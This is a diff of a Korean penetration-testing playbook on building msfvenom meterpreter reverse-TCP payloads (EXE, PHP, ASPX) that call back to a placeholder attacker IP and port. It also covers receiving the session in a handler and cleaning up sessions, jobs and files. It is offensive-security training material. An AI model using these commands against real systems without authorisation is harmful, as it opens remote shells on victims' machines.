@@ -14,11 +14,7 @@ tags:
 
 대상 운영체제·CPU 아키텍처·실행 환경을 알고 대상에서 공격 호스트의 수신 포트까지 연결할 수 있다면, 동일한 payload 설정으로 실행 파일과 handler를 준비해 대상의 현재 실행 계정으로 세션을 받는다.
 
-## 사용할 때
-
-- 웹 업로드, RCE, 파일 실행, MSI/EXE/WAR/ASPX/PHP payload가 필요할 때.
-- Metasploit exploit이 아니라 별도 전달 경로로 Meterpreter/shell을 받고 싶을 때.
-- staged/stageless 차이를 선택해야 할 때.
+전달 경로가 웹 업로드·RCE·파일 실행 중 하나로 이미 확인되어야 한다. payload 생성 성공은 전달·실행·handler 연결 성공과 별개이며, staged/stageless 선택은 아래 payload와 handler의 일치 조건으로 판단한다.
 
 ## 전제 조건
 
@@ -29,6 +25,8 @@ tags:
 | 역방향 연결 경로 | 대상에서 공격 호스트의 IP와 수신 포트로 실제 TCP 연결 | payload가 사용할 주소와 포트로 연결 가능 |
 
 ## 실행
+
+생성 block은 공격 호스트에서 실행한다. `<ATTACKER_IP>`·`<PORT>`는 reverse callback의 listener IP·TCP 포트(가상 예: `192.0.2.10`, `4444`), `<LOCAL_PAYLOAD_FILE>`은 작업 전 존재하지 않는 절대 출력 경로다. payload 생성은 전달·실행·session 성공과 별도다.
 
 ### 방식 선택
 
@@ -49,7 +47,6 @@ tags:
 ```bash
 test ! -e '<LOCAL_PAYLOAD_FILE>'
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o '<LOCAL_PAYLOAD_FILE>'
-sha256sum '<LOCAL_PAYLOAD_FILE>'
 ```
 
 확인할 출력:
@@ -64,7 +61,6 @@ sha256sum '<LOCAL_PAYLOAD_FILE>'
 ```bash
 test ! -e '<LOCAL_PAYLOAD_FILE>'
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw -o '<LOCAL_PAYLOAD_FILE>'
-sha256sum '<LOCAL_PAYLOAD_FILE>'
 ```
 
 확인할 출력:
@@ -79,7 +75,6 @@ sha256sum '<LOCAL_PAYLOAD_FILE>'
 ```bash
 test ! -e '<LOCAL_PAYLOAD_FILE>'
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx -o '<LOCAL_PAYLOAD_FILE>'
-sha256sum '<LOCAL_PAYLOAD_FILE>'
 ```
 
 확인할 출력:
@@ -130,9 +125,9 @@ jobs -v
 | 변경 대상 | 기존 상태·식별값 | 종료·정리 | 완료 확인 |
 |---|---|---|---|
 | 대상 payload process와 session | 이번에 열린 `<SESSION_ID>`, `getpid`·`getuid`·`sysinfo` | 원격 후속 작업과 파일 정리를 마치고 msfconsole로 돌아온 뒤 `sessions -k <SESSION_ID>` | `sessions -l`에 해당 ID가 없음 |
-| 대상 payload 파일 | 실행 전 존재하지 않은 `<REMOTE_PAYLOAD_FILE>`과 업로드 hash | session 종료 뒤에도 사용할 원래 접근 경로가 있으면 exact 경로만 삭제하고 재조회 | 경로가 없고 기존 파일은 유지됨 |
+| 대상 payload 파일 | 실행 전 존재하지 않은 `<REMOTE_PAYLOAD_FILE>`과 업로드 경로 | session 종료 뒤에도 사용할 원래 접근 경로가 있으면 exact 경로만 삭제하고 재조회 | 경로가 없고 기존 파일은 유지됨 |
 | handler job과 listener | 실행 전 `jobs -l`, 이번 `<HANDLER_JOB_ID>`·LHOST·LPORT | session 종료 확인 뒤 `jobs -k <HANDLER_JOB_ID>` | `jobs -l`에 해당 ID가 없고 OS의 listener 조회에 이번 job의 포트가 없음 |
-| 공격 호스트 생성 파일 | 실행 전 `test ! -e '<LOCAL_PAYLOAD_FILE>'`, 생성 후 SHA-256 | 결과 인계와 대상 정리 뒤 `rm -- '<LOCAL_PAYLOAD_FILE>'` | `test ! -e '<LOCAL_PAYLOAD_FILE>'` 성공 |
+| 공격 호스트 생성 파일 | 실행 전 `test ! -e '<LOCAL_PAYLOAD_FILE>'`, 생성 경로 | 대상 정리와 보존 여부 결정 뒤 `rm -- '<LOCAL_PAYLOAD_FILE>'` | `test ! -e '<LOCAL_PAYLOAD_FILE>'` 성공 |
 
 대상 파일이 실행 중이라 삭제할 수 없으면 session·process를 먼저 끝낸 뒤 원래 전달 경로로 제거한다. 원래 접근 경로가 없고 session 종료 후 대상 파일을 재확인할 수 없다면 원격 정리 완료로 기록하지 않는다. `sessions -K`·`jobs -K`처럼 다른 작업까지 종료하는 명령은 사용하지 않는다.
 
